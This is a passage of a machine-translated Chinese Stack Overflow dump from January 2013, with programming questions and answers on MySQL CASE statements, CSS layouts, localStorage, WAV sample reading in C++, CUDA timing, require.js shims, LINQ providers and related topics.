> 时间：2013-01-01T14:21:57.737

C 中的数组非常“弱”，通常在运行时仅由指向第一个元素的指针表示。当您声明类似`int a[][]`的内容时，不可能知道如何计算每个元素的地址，因为类型声明没有说明。这就是它无法编译的原因，因为类型无效。

如果你可以有`int a[][]`, 然后调用它传递一个`int big[8][8]`or `int small[2][2]`，那么函数内部的代码就无法神奇地“适应”这些不同数组的正确地址计算。这就是为什么它不起作用。

您可以编写一个通用函数`int *matrix, size_t width`，例如手动进行地址计算，即元素 " `matrix[i][j]`"`matrix[i * width + j]`用于[row-major ordering](http://en.wikipedia.org/wiki/Row-major_order)。

# mysql - 如何在 MySQL 的 case 语句中使用比较运算符？

> ID：14111215
> 
> 赞同：10
> 
> 时间：2013-01-01T14:16:23.623
> 
> 标签：mysql, case

这是我的表格数据：

```
id | days
-----------
1  | 10
2  | 20
3  | 30
4  | 25
5  | 5 
```

我想要这样的结果：

```
id  days    resultcolumn
1    10     less than 10
2    20     less than 20
3    30     less than 30
4    25     less than 30
5    5      less than 10 
```

我使用了以下查询：

```
SELECT id,days,
  CASE days 
    WHEN days<=10 THEN 'less than 10'
    WHEN days<=20 THEN 'less than 20'
    WHEN days<=30 THEN 'less than 30'
  END AS 'days2'
FROM calender 
```

但我得到了这样的结果数据：

```
id  days    resultcolumn
1    10       {null}
2    20       {null}
3    30       {null}
4    25       {null}
5    5        {null} 
```

如何使用`CASE`MySQL 中的语句获得原始结果？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-01-01T15:11:03.127

试试这个：

```
SELECT
      id,
      days,
      CASE WHEN days<=10 THEN 'less than 10'
           WHEN days<=20 THEN 'less than 20'
           WHEN days<=30 THEN 'less than 30' END AS 'days2'
    FROM calender 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-01T14:19:49.450

您只需要在 CASE 之后删除几天：

```
SELECT
  id,
  days,
  CASE WHEN days<=10 THEN 'less than 10'
       WHEN days<=20 THEN 'less than 20'
       WHEN days<=30 THEN 'less than 30' END AS 'days2'
FROM calender 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-01T14:35:43.710

你可以在没有`CASE ... WHEN`构造的情况下做到这一点。只需使用简单的数学。

```
SELECT *, 
    CONCAT('less than ', CEIL(`days`/10)*10) AS `resultcolumn` 
FROM `Table1` 
```

[**sqlfiddle**](http://sqlfiddle.com/#!2/ff4cc/4)

这可以防止[分支预测](http://en.wikipedia.org/wiki/Branch_predictor)失败。因此[对于大型数据集会更快](https://stackoverflow.com/questions/11227809 "为什么处理排序数组比处理未排序数组更快？")。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-01T16:46:07.863

试试这个：

```
SELECT id,days,
  CASE  
      WHEN days<=10 THEN 'less than 10'
      WHEN days<=20 THEN 'less than 20'
      WHEN days<=30 THEN 'less than 30'
  END AS 'resultcolumn'
FROM calender 
```

# jquery - Wordpress - Wunderslider 全屏模式问题

> ID：14111216
> 
> 赞同：0
> 
> 时间：2013-01-01T14:16:36.417
> 
> 标签：jquery, wordpress

我遇到了问题，例如在全屏模式下，图片出现在博客的后面 - 就在背景图片的前面 - 而不是在前面。

你知道这里可能是什么问题吗？

提前谢谢了！

[http://wunderslider.com/wordpress/fullscreen/](http://wunderslider.com/wordpress/fullscreen/)

阿什什

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-29T02:57:58.903

您用于滑块“ **wunderslider** ”的插件使类名为“wunderslider-wrapper”的 div 元素的 z-index 值为 -1，使其出现在后面。

# ruby-on-rails - 我应该将哪些其他标头传递给 Advanced Rest Client 才能测试需要登录的 .js 发布操作？

> ID：14111220
> 
> 赞同：3
> 
> 时间：2013-01-01T14:17:06.973
> 
> 标签：ruby-on-rails, ruby, api, http, rest

我正在使用`Advanced Rest Client`chrome 扩展来测试一些 REST 操作。

一项操作被定义为`resources`routes.rb 中条目上的 POST 成员路由。我`Cookie`在标题选项卡中传递标题，并且我还将`Accept`标题设置为`text/javascript, application/javascript`.

无论如何，我总是收到一个`302`要求我重定向的错误消息，或者一个`401`错误说我需要登录或验证才能继续。

该动作有一个`before_filter :authenticate_user!`，但我想如果我设置`Cookie`标题，它就会起作用。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T15:12:46.517

我终于设法发出正确的 POST 请求，这些是我使用的标头：

```
Accept:*/*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript
Cache-Control:no-cache
Origin:http://localhost:3000
Pragma:no-cache
Referer:http://localhost:3000/user/5
X-CSRF-Token:0RVGFyjo7kdng8K3pUiX9b7TAoZwSNN8uUvm5wZuORk=
Cookie:your_cookie_here 
```

注意 X-CSRF-Token。

# php - 子查询格式问题

> ID：14111230
> 
> 赞同：1
> 
> 时间：2013-01-01T14:18:19.150
> 
> 标签：php, mysql, subquery

我无法为子查询获取正确的格式。

我的一个查询显示以下内容：

这涉及调用三个表格（Ind Stats 表格，用于提取 Game Stats 和 Teams Name）。如您所见，此查询工作正常。

我遇到的麻烦是如何在特定游戏中拉出每个有 DD 的玩家。玩家是数据库中的另一个能力。我所能理解的是我应该需要一个子查询，但子查询不是我的强项。

这是我的代码

```
 SELECT * FROM 

        (SELECT game_Date, 
        game_GameID,
        game_SeasonID,
        game_TeamCode,
        teams_Name,
        stats1_GameID,
        Sum(stats1_DD) AS 'TotGameDD'

        FROM game INNER JOIN teams INNER JOIN stats1
        ON 
        teams_TeamCode = game_TeamCode
        AND
        game_GameID = stats1_GameID

        GROUP BY game_GameID
        HAVING Sum(stats1_DD) >1
        ORDER BY Sum(stats1_DD) desc) t

    INNER JOIN  players INNER JOIN stats1 INNER JOIN game 
    ON stats1_GameID = game_GameID
            AND
    sstorm_rawstats1.stats1_PlayerID = sstorm_players.player_PlayerID 
```

"

所以，要清楚，这很好用：

```
 SELECT game_Date, 
    game_GameID,
    game_SeasonID,
    game_TeamCode,
    teams_Name,
    stats1_GameID,
    Sum(stats1_DD) AS 'TotGameDD'

    FROM game INNER JOIN teams INNER JOIN stats1
    ON 
    teams_TeamCode = game_TeamCode
    AND
    game_GameID = stats1_GameID

    GROUP BY game_GameID
    HAVING Sum(stats1_DD) >1
    ORDER BY Sum(stats1_DD) desc 
```

我只是想在此处的行中显示记录 DD 的玩家的姓名。我现在得到了这个名字，但它正在计算玩家玩过的所有游戏。我现在很近了。

![在此处输入图像描述](../Images/64a7ea695cce8b24f09d0e8ed0f367bc.png)

**更新：我现在可以在表格中显示结果，但它只显示一名获得 DD 的玩家。我想我需要一个循环来显示所有拥有 DD 的用户。任何帮助，非常感谢。**

![在此处输入图像描述](../Images/1f78750d37f40aca785e9c62c11886c7.png)

我只是通过在 FROM 语句中添加一个 GROUP BY stats1_DD 和另一个 AND 来更改上面的代码，如下所示：

```
 FROM game INNER JOIN teams INNER JOIN stats1
    ON 
    teams_TeamCode = game_TeamCode
    AND
    game_GameID = stats1_GameID
    AND
    game_PlayerID = player_PlayerID

    GROUP BY game_GameID, stats1_DD
    HAVING Sum(stats1_DD) >1
    ORDER BY Sum(stats1_DD) desc 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T14:32:45.513

您应该将第三个表与来自您已经拥有的查询的结果集或直接在目标列上的三个表连接起来`DD`。就像是：

```
SELECT * 
FROM YourCrrentQuery t
INNER JOIN ThePlayersTable p ON p.DD = t.DD; 
```

**或者：**

```
SELECT * 
FROM YourCrrentQuery t
WHERE DD IN (SELECT DD 
             FROM ThePlayersTable 
             WHERE DD IS NOT NULL); 
```

* * *

**更新：**您将需要像这样`JOIN`使用表的子查询：`Players`

```
SELECT * 
FROM 
(
   SELECT 
     game_Date, 
     game_GameID,
     game_SeasonID,
     game_TeamCode,
     teams_Name,
     stats1_GameID,
     Sum(stats1_DD) AS 'TotGameDD'
     FROM game 
     INNER JOIN teams 
     INNER JOIN stats1  ON teams_TeamCode = game_TeamCode
                       AND game_GameID    = stats1_GameID
     GROUP BY game_GameID
     HAVING Sum(stats1_DD) >1
) t
INNER JOIN players p ON t.TotGameDD = p.DD
ORDER BY t.TotGameDD desc; 
```

# c++ - 在其他操作系统中搜索 IDE 的 ios

> ID：14111232
> 
> 赞同：-1
> 
> 时间：2013-01-01T14:18:44.533
> 
> 标签：c++, objective-c

如果我想在 iOS 中构建应用程序，可以使用什么 IDE？可以在 Eclipse 中使用类似于 Mono 或插件的东西吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:41:03.007

我一直在为我的上一个应用程序使用[AppCode](http://www.jetbrains.com/objc/)进行编码，虽然它是付费的，但物有所值，但我没有使用 appcode 完成任何 c++，但大多数用于编码、重构和建议的高级 ide 功能都比在代码

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T14:24:22.920

你可以试试这个

[http://www.gnustep.org/](http://www.gnustep.org/)

但最好的总是 XCode。

# css - 如何使用 CSS 显示居中的 div 墙？

> ID：14111236
> 
> 赞同：0
> 
> 时间：2013-01-01T14:19:25.190
> 
> 标签：css, css-float

> **可能的重复：**
> [CSS 适当的方式来居中内容](https://stackoverflow.com/questions/722648/css-appropriate-way-to-center-content)

我的目标是使用 CSS（而不是表格）显示一堵图片墙。

我希望图片**在容器的中心对齐**

`wallElement`应该有`320px`宽度和`240px`高度。

```
<div id="container" style="width:100%">
  <div style="width:320px;height:240px">MyPicture1</div>
  <div style="width:320px;height:240px">MyPicture2</div>
</div> 
```

我试过`display:inline-block;`没有运气。我取得了成功，`float: left;`但墙元素没有居中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T18:51:52.190

`inline-block`将提供您要求的解决方案。

这是一个如何实现的工作示例：http: [//jsfiddle.net/2BHTH/2/](http://jsfiddle.net/2BHTH/2/)

**HTML**

```
<div id="Container">
 <div class="picture">MyPicture1</div>
 <div class="picture">MyPicture2</div>
 <div class="picture">MyPicture3</div>
 <div class="picture">MyPicture4</div>
</div>​ 
```

**CSS**

```
body { 
    width:95%;
    margin: 0 auto;        
}

#Container {
    padding:.5em;
    margin: 0 auto;
    display:inline-block;
    background-color:#eee;
}

div.picture {
    width:320px;
    height:240px;
    display:inline-block;
    margin: .5em;
    background-color:#ccc;
}​ 
```

# css - 基础 CSS 框架下拉选择

> ID：14111237
> 
> 赞同：0
> 
> 时间：2013-01-01T14:19:46.033
> 
> 标签：css, select, zurb-foundation

我正在使用基础 CSS。但下拉选择我用作一个简单的 HTML 标记。

问题是下拉菜单不适用于小型（移动）窗口。

我在这里重现了错误[http://jsfiddle.net/BZrT8/1/](http://jsfiddle.net/BZrT8/1/)（在CSS块中我添加了我使用的foundation.css和main.css）。

我发现问题是由**foundation.css**`float:left;`中的property`.row .mobile-three`属性引起的

 **任何想法为什么`float:left;`使下拉列表不起作用？以及如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T16:39:47.947

您有一个 div 在窄屏幕上与您的选择重叠：

```
<div class="seven columns"></div> 
```

你看不到它，因为它没有内容或背景。它向右浮动并占据空间；因为它在 DOM 中较晚，所以它超出了您的选择。

删除此 div 或重新定位/重新浮动它。**

# machine-learning - 仅基于表格数据检测 HTML 表格方向

> ID：14111241
> 
> 赞同：2
> 
> 时间：2013-01-01T14:19:50.340
> 
> 标签：machine-learning, classification, statistics

给定一个 HTML 表格，其中没有一个单元格被标识为“< th >”或“标题”单元格，我想自动检测该表格是“垂直”表格还是“水平”表格。

例如：这是一个水平表：

![在此处输入图像描述](../Images/bbef74ad6a0cf5b011e1e2ec71ac1f49.png)

这是一个垂直表：

![在此处输入图像描述](../Images/dbd904581ef57c15b31180d3459ba4f7.png)

当然请记住，“粗体”属性以及阴影和任何样式属性在分类时都将不可用。

我正在考虑通过统计方法来解决这个问题，我可以手写几个特征，比如“如果第一行有数字，但第一列没有。那可能是一个垂直表”，并为每个特征打分并结合起来决定表方向的类。

你就是这样处理这样一个问题的吗？我以前没有使用过任何基于统计的算法，我不确定对于这样的问题什么是最佳的

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T15:28:49.677

这是一个有点令人困惑的问题。您在询问 ML 方法，但您似乎还没有创建训练/交叉验证/测试集。如果没有数据预处理步骤，任何关于 ML 方法的讨论都是无用的。

*如果我是对的并且您还没有创建数据集*- 给我们更多关于数据的信息（如果你看一个例子，你怎么知道表格是垂直的还是水平的？，你有多少数据，是始终确定 s 表是否垂直/水平，...）

*如果您已经创建了训练集/交叉验证集/测试集*，请向我们提供更多关于训练集的详细信息（特征是什么、示例数量、您是否需要白盒解决方案（您可以了解为什么 ML 模型会给您这个结果） ),...)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-02T13:15:25.523

表的域有多通用？我知道一些 Web 表模式识别算法使用来自通用知识模式（如 Freebase）的类型、属性和实例数据来尝试识别与列关联的属性。您可以尝试在分类器中利用这些知识。

如果您想在没有任何外部信息的情况下执行此操作，则需要一堆手工标记的水平和垂直示例。

您说“当然”字体信息不可用，但我不会这么快就忽略它，因为它可能是非常有用的信息的来源。你确定你不能从管道中更远一点的地方获取你的数据，以便你可以访问这些信息吗？

# android - 将 PopupMenu MenuItem 更改为自定义项？

> ID：14111244
> 
> 赞同：0
> 
> 时间：2013-01-01T14:20:10.710
> 
> 标签：android, menuitem, popupmenu

有没有办法在 PopupMenu 中使用自定义视图？

我以这种方式将项目添加到菜单中：

```
MenuItem item = menu.add(Menu.NONE, i, Menu.NONE,"blabla"); 
```

现在，我可以用“项目”做什么？

我成功地改变了标题，并把它变成了可检查的。但我想要的不止这些

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-04T12:31:09.187

好吧，我最终得到了 ListPopupWindow：http: [//developer.android.com/reference/android/widget/ListPopupWindow.html](http://developer.android.com/reference/android/widget/ListPopupWindow.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T14:29:14.163

### 您应该看看[构建自定义对话框](http://developer.android.com/guide/topics/ui/dialogs.html#CustomDialog)。在 Android 中，对话框通常采用弹出窗口的形式。您也可以使用 Activity 执行此操作并将 Dialog 主题应用到它（在此链接中提到）。

# jquery - localStorage：第二个值没有被存储？

> ID：14111250
> 
> 赞同：0
> 
> 时间：2013-01-01T14:21:00.823
> 
> 标签：jquery, local-storage

这可能是一个简单的语法错误或类似的错误，但我一辈子都看不到它。我之前在更复杂的结构上使用过 localStorage 没有问题，所以我很困惑为什么这不起作用。

```
$('.symbols').click(function(){
    if ($(this).attr("checked") == "checked"){
        setPreferences("symbols", true);
    } else {
        setPreferences("symbols", false);
    }
});

$('.length').on('change', function() {
    setPreferences("length", $(this).attr('value'));
});

function setPreferences (key, value) {
    console.log("Key[ " + key + " ], Val[ " + value + "]");
    localStorage[key] = value; // I've also tried "" + value
} 
```

设置*符号*可以正常工作，但不存储*长度。*console.log 在相应事件上打印预期的键/值对，我可以从 Chrome 调试器中看到它试图分配空间——检查时它不存在。触发事件的顺序无关紧要，只有“符号”被正确存储。

从选择“长度”中选择值 16 时的控制台打印：

> 键[长度]，值[16]

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T14:31:35.207

在您的示例中，您使用“长度”作为键名。但是由于长度已经是 localstorage 对象的属性，所以不能将其用作自定义关键字。尝试一下，看看它是否有效：

```
setPreferences("customlength", $(this).val());// as suggested on other answer, better to use .val() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T14:24:47.910

这是正确的语法

```
$('.length').on('change', function() {
    setPreferences("length", $(this).val());
}); 
```

`val()`允许检索输入元素的值：http: [//api.jquery.com/val/](http://api.jquery.com/val/)

# c++ - 每个样本的 istream::read 和 wav 格式位

> ID：14111252
> 
> 赞同：1
> 
> 时间：2013-01-01T14:21:19.150
> 
> 标签：c++, wav, istream

下面是我用来读取每个样本 wav 的 16 位和 32 位的代码，它们工作得很好。

我的问题是，如何读取剩余的 8 位无符号、24 位有符号和 32 位**浮点**wav？

**读取一个 16 位有符号 wav 样本：**

```
short buffer;

file.read( ( char * ) &readbuffer, 2 ); 
```

**读取一个 32 位有符号 wav 样本：**

```
int buffer;

file.read( ( char * ) &readbuffer, 4 ); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T15:32:27.717

您正在对目标机器做出一些假设。根据 Microsoft [WAV 格式](https://ccrma.stanford.edu/courses/422/projects/WaveFormat/)，所有样本数据都是 little-endian。您还期望各种数据类型具有您想要的大小，但情况并非总是如此。

但是由于您当前的例程对您有用，我们暂时不会关注这一点（但您可能应该在某个时候解决这些问题）

## 32 位浮点数

如果我们忘记了可怕的字节序和非标准类型大小，使用您的其他代码作为模板，32 位浮点情况变得相对简单：

```
float buffer;
file.read( ( char * ) &buffer, 4 ); 
```

[这个问题](https://stackoverflow.com/questions/1422817/how-to-read-a-float-from-binary-file-in-c)更详细地涵盖了从二进制源读取浮点数。

## x 位无符号

由于我们知道您的机器正确地解释了 16 位和 32 位的情况，我们可以假设它是小端。这意味着您可以将所有内容读入一个已初始化为零的无符号整数，并且剩余的字节已经为您正确填充：

```
unsigned int buffer = 0;
file.read( ( char * ) &buffer, 1 );   // 8bit unsigned integer

buffer = 0;
file.read( ( char * ) &buffer, 3 );   // 24bit unsigned integer 
```

## x 位有符号

最后，如果您正在读取有符号整数，则需要根据刚刚读取的数字的值填充缓冲区变量的剩余字节：

*   如果数字是正数，你可以用 0 填充
*   如果数字为负数（设置了最高有效字节的最高位），则使用 \xFF 字节填充。

此代码适用于 24 位有符号整数：

```
long buffer;
int number_of_bytes = 3;             // 24 bit signed integer

file.read( (char *) &buffer, number_of_bytes);

// Determine the padding byte
unsigned char padding_byte = 0;
if ( ((char*) &buffer)[number_of_bytes - 1] & 128) {
    padding_byte = 255;
}

// Pad the data
for (int i = number_of_bytes; i < sizeof(buffer); i++) {
    ((char*) &buffer)[i] = padding_byte;
} 
```

再一次，我觉得我应该指出这段代码在某些机器上会失败，因为你没有检查字节序。但是你需要做的就是[检查](https://stackoverflow.com/questions/1001307/detecting-endianness-programmatically-in-a-c-program)运行代码的机器的字节序，如果你在一个大字节序的机器上，则颠倒字节的顺序。

# cuda - 通过增加 CUDA VecAdd 示例中的 blocksPerGrid 和 threadsPerBlock 来增加内核延迟，这是什么意思？

> ID：14111256
> 
> 赞同：1
> 
> 时间：2013-01-01T14:21:53.883
> 
> 标签：cuda

当我测试以下示例时，我发现通过增加 blocksPerGrid 和 threadsPerBlock 内核延迟会增加

这样如果

```
int threadsPerBlock = 1;    
int blocksPerGrid = 1; 
```

blocksPerGrid 和 threadsPerBlock 等于 1 内核的延迟 = .0072 ms

但是当我进行以下操作时，延迟变得更高= .049 ms

```
int threadsPerBlock = 1024;
int blocksPerGrid = (N+threadsPerBlock-1) / threadsPerBlock; 
```

在哪里

```
N = 50000; //the no. of array elements 
```

下面是完整的 VecAdd 示例。你可以测试一下

```
// Includes
#include <stdio.h>
#include <cutil_inline.h>
#include <shrQATest.h>

// Variables
float* h_A;
float* h_B;
float* h_C;
float* d_A;
float* d_B;
float* d_C;
bool noprompt = false;

// Functions
void CleanupResources(void);
void RandomInit(float*, int);
void ParseArguments(int, char**);

 // Device code
 __global__ void VecAdd(const float* A, const float* B, float* C, int N)
{
  int i = blockDim.x * blockIdx.x + threadIdx.x;
  if (i < N)
      C[i] = A[i] + B[i];
 } 

 // Host code
 int main(int argc, char** argv)
 {
     shrQAStart(argc, argv);

cudaEvent_t event1, event2;
cudaEventCreate(&event1);
cudaEventCreate(&event2);

 printf("Vector Addition\n");
 int N = 50000;
 size_t size = N * sizeof(float);
 ParseArguments(argc, argv);

// Allocate input vectors h_A and h_B in host memory
h_A = (float*)malloc(size);
if (h_A == 0) CleanupResources();
h_B = (float*)malloc(size);
if (h_B == 0) CleanupResources();
h_C = (float*)malloc(size);
if (h_C == 0) CleanupResources();

// Initialize input vectors
RandomInit(h_A, N);
RandomInit(h_B, N);

// Allocate vectors in device memory
cutilSafeCall( cudaMalloc((void**)&d_A, size) );
cutilSafeCall( cudaMalloc((void**)&d_B, size) );
cutilSafeCall( cudaMalloc((void**)&d_C, size) );

// Copy vectors from host memory to device memory
cutilSafeCall( cudaMemcpy(d_A, h_A, size, cudaMemcpyHostToDevice) );
cutilSafeCall( cudaMemcpy(d_B, h_B, size, cudaMemcpyHostToDevice) );

 // Invoke kernel
 int threadsPerBlock = 1024;
 int blocksPerGrid = (N+threadsPerBlock-1) / threadsPerBlock;

 cudaEventRecord(event1, 0); 
 VecAdd<<<blocksPerGrid, threadsPerBlock>>>(d_A, d_B, d_C, N);
 cudaEventRecord(event2, 0);

cudaEventSynchronize(event1); //optional
cudaEventSynchronize(event2);

float dt_ms;
cudaEventElapsedTime(&dt_ms, event1, event2);

printf("delay_time = %f\n", dt_ms);

   cutilCheckMsg("kernel launch failure");
 #ifdef _DEBUG
  cutilSafeCall( cutilDeviceSynchronize() );
 #endif

  // Copy result from device memory to host memory
  // h_C contains the result in host memory
  cutilSafeCall( cudaMemcpy(h_C, d_C, size, cudaMemcpyDeviceToHost) );

  // Verify result
  int i;
  for (i = 0; i < N; ++i) {
      float sum = h_A[i] + h_B[i];
      if (fabs(h_C[i] - sum) > 1e-5)
          break;
  }

     CleanupResources();
     shrQAFinishExit(argc, (const char **)argv, (i==N) ? QA_PASSED : QA_FAILED);

 }

  void CleanupResources(void)
 {
  // Free device memory
  if (d_A)
     cudaFree(d_A);
  if (d_B)
     cudaFree(d_B);
  if (d_C)
     cudaFree(d_C);

  // Free host memory
  if (h_A)
     free(h_A);
  if (h_B)
     free(h_B);
  if (h_C)
     free(h_C);

  cutilDeviceReset();
 }

  // Allocates an array with random float entries.
  void RandomInit(float* data, int n)
 {
    for (int i = 0; i < n; ++i)
    data[i] = rand() / (float)RAND_MAX;
 }

 // Parse program arguments
 void ParseArguments(int argc, char** argv)
 {
   for (int i = 0; i < argc; ++i) {
      if (strcmp(argv[i], "--noprompt") == 0 ||
          strcmp(argv[i], "-noprompt") == 0) 
      {
        noprompt = true;
        break;
        }
    }
  } 
```

谁能为我解释一下这是什么意思？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-07T23:25:43.123

在情况 1 中，启动大小为 1 的内核线程并执行 2 次读取和 1 次写入操作。在案例 2 中，启动大小为 50176 线程的内核并执行 100,000 次读取和 50,000 次写入操作。将工作负载增加 50,000 会使执行时间增加约 7 倍。两次发射所做的工作明显不同。

# entity-framework - 具有实体框架并发的清洁域模型为什么我被迫使用 RowVersion？

> ID：14111260
> 
> 赞同：0
> 
> 时间：2013-01-01T14:22:20.990
> 
> 标签：entity-framework, concurrency, rowversion

嗨，有一个干净整洁的域模型。如：

```
public class Blog
{
    public int Id {get;set;}
    public string Title {get;set;}
    public string Body {gets;set;}
} 
```

为什么 Entity Framework 强制我使用 RowVersion 属性污染域模型以提供并发性？

我的模型不想或不需要知道这一点，那么我为什么要被迫使用它呢？是否有另一种方法来执行并发检查？如果是这样，它比添加行版本更好/更差还是更快/更慢？或者我可以在不在域模型中的其他地方添加 RowVersion。我正在使用 EF 4.1 和流利的 api。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T14:28:28.760

尝试使用基类并将所有属性用于安全性、并发检查。

# php - 在php中，为什么array_unshift()被命名为unshift？

> ID：14111261
> 
> 赞同：2
> 
> 时间：2013-01-01T14:23:01.953
> 
> 标签：php

众所周知，有四个函数可用于插入和删除数组：

1.  array_push()
2.  数组弹出（）
3.  array_unshift()
4.  数组移位（）

和是什么意思，我的`array_unshift()`意思`array_shift()`是为什么它们被这样命名？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-01T14:29:48.953

这是历史的。在较新的语言中，我们可能不再称其为“shift”，而来自 Perl 的旧术语包括[**shift**](http://perldoc.perl.org/functions/shift.html)关键字，其作用是：

> [Shift] 关闭数组的第一个值并将其返回，将数组缩短 1 并将所有内容向下移动。

这通常与`@_`包含函数参数的数组一起使用，并且`shift`一次提供对它们的访问。

PHP，在 Perl 仍然广泛用于 Web 编程的早期，只是简单地采用了这个术语，添加了“反向”`unshift`并离开了它。

另一个例子是，它以*libc*函数[`glob`](http://php.net/manual/en/function.glob.php)命名。我想其目的是让那些从现有语言转向 PHP 的人熟悉这些功能，但十年后回想起来，也许这些术语已经过时了。 *`glob()`*

 ** * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T14:29:58.907

我找不到明确的来源，但我的猜测是它源于对[移位寄存器](http://en.wikipedia.org/wiki/Shift_register)的熟悉，它的行为方式相似。

您会[在 Perl 中找到类似的函数](http://perldoc.perl.org/functions/shift.html)，PHP 从中借鉴了很多。我猜 Perl 也借鉴了其他来源，但最终，您会遇到一位语言设计者，他认为将操作称为“移位”是合乎逻辑的，因为它类似于移位寄存器。

其他语言使用相同的命名习惯，例如[Javascript](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/shift)和[ActionScript](http://help.adobe.com/en_US/AS2LCR/Flash_10.0/help.html?content=00000748.html)，但其他语言可能使用其他术语，例如 queue/dequeue - 请参阅[C#](http://msdn.microsoft.com/en-us/library/system.collections.queue.dequeue.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T14:25:11.967

`array_shift()`将数组的第一个值移开并返回，将数组缩短一个元素并向下移动（**移位**）所有其他值。*

# javascript - 如何使用 Require.js 加载 Heyoffline.js

> ID：14111262
> 
> 赞同：0
> 
> 时间：2013-01-01T14:23:01.893
> 
> 标签：javascript, requirejs, js-amd

我正在尝试使用 require.js 加载[Heyoffline](https://github.com/oskarkrawczyk/heyoffline.js)我尝试了 shim config

```
require.config({
    paths : {
        heyoffline  : "libs/heyoffline"
    },
    shim: {
        'heyoffline': {
            exports: 'Heyoffline'
        }
    }
}); 
```

在模块文件中。

```
define(["heyoffline"], function (Heyoffline) {
  new Heyoffline;
} 
```

其他部门正在加载没有问题。

我只得到以下异常：

```
Uncaught TypeError: undefined is not a function 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:14:03.427

Heyoffline 不是 AMD 模块。我认为问题在于[require.js](http://requirejs.org/docs/api.html#config-shim)正在等待`Heyoffline`加载。在这种情况下，它在**全局范围**和**窗口范围**上定义。该`exports`属性首先找到**全局**值，但在您的 中`define`，您需要**窗口**值，该值尚未加载。

有**两种可能的解决方案**（未经测试，因为我没有使用 Heyoffline）：

**1) 适应 Heyoffline**

尝试使用以下内容更改 heyoffline.js。更改`window.Heyoffline`方式`window.Heyoffline2`（在文件末尾）：

```
return window.Heyoffline2 = new Heyoffline; 
```

相应地更改您的垫片：

```
shim: {
        'heyoffline': {
            exports: 'Heyoffline2'
        }
    } 
```

**2) 使用 domReady 插件**

您可以尝试的另一种可能性是使用插件[domReady](http://requirejs.org/docs/download.html#domReady)。还要`Heyoffline`从函数中删除参数，并使用`window.Heyoffline`以确保使用正确的对象：

```
define(["domReady!heyoffline"], function () {
  new window.Heyoffline;
} 
```

# c# - 将 ParameterExpression 解析为实际的 Expression

> ID：14111266
> 
> 赞同：3
> 
> 时间：2013-01-01T14:23:36.910
> 
> 标签：c#, linq, expressionvisitor

我编写了一个 LINQ-Provider，它运行良好，但有一个例外。它将 LINQ 查询转换为 ODATA URL 标准。

如果我有以下 LINQ 语句：

```
.Select(x => x.Name.ToLower()).OrderByDescending(x => x) 
```

当我用表达式访问者访问表达式树时，我会得到一个表达式部分（OrderByDescending），它的类型是ParameterExpression。

![用于 ParameterExpression 的 IntelliSense](../Images/2f62da64dc31eaf4f7c0bbe11bc2b396.png)

我现在的问题是：如何获得选定的 x.Name.ToLower() 表达式？这样我就可以将 orderBy 语句翻译为

```
$orderby=tolower(Name) desc 
```

**// 编辑：换句话说：我有一个 ParameterExpression {x => x}。我希望将此表达式解析为 {x => x.Name.ToLower()}**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T16:54:57.177

您的代码有两个问题：

1) 上面的 LINQ 表达式并不表示 /Entities?$orderby=tolower(Name) desc。实际上没有办法将其转换为 OData。LINQ 查询将获取所有实体，获取它们的 Name 属性并返回小写的字符串（名称）列表。它还将对列表进行排序（降序）。

2) 此类表达式的表达式树如下所示：

```
Call OrderBy
- Argument 1 = Call Select
    - Argument 1 = Entities
    - Argument 2 = Lambda with parameter x(1)
       Body = ToLower(x(1).Name)
- Argument 2 = Lambda with parameter x(2)
   Body = x(2) 
```

x(1) 和 x(2) 是 ParameterExpression 节点，它们表示 Select 和 OrderBy 调用中 lambda 的参数。将 x(2) 替换为 Select (ToLower(x(1).Name)) 的 lambda 主体将不起作用。首先，该主体中有 x(1) 参数，这在第二个 lambda 的上下文中没有任何意义。其次，它会改变表达的意思。

要获得 $orderby=tolower(Name) desc，输入上的 LINQ 表达式必须类似于：

```
Entities.OrderByDescending(x => x.Name.ToLower()) 
```

# data-structures - 二叉搜索树删除操作

> ID：14111267
> 
> 赞同：2
> 
> 时间：2013-01-01T14:24:00.313
> 
> 标签：data-structures, binary-tree, binary-search-tree

我有一本书以一种非常糟糕的方式解释了整个二叉搜索树，到目前为止，我已经能够仔细研究我的书并了解二叉搜索树，但是我找到了二叉搜索树操作的解释`Delete`

我确实了解前两个简单的操作：

*   删除叶子（没有孩子的节点）：删除叶子很容易，因为我们可以简单地将它从树中删除。
*   删除具有一个子节点的节点：删除节点并将其替换为其子节点。

然而，有两个孩子的人对我来说真的很难理解，我已经在 wiki 和其他网站上阅读过，试图找到解决方案，但我发现解释有点加密。

我希望这里有人可以给我更多细节或以另一种方式向我解释？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:52:39.233

如果你理解了前两条规则，那么删除一个有两个孩子的节点就不难理解了。

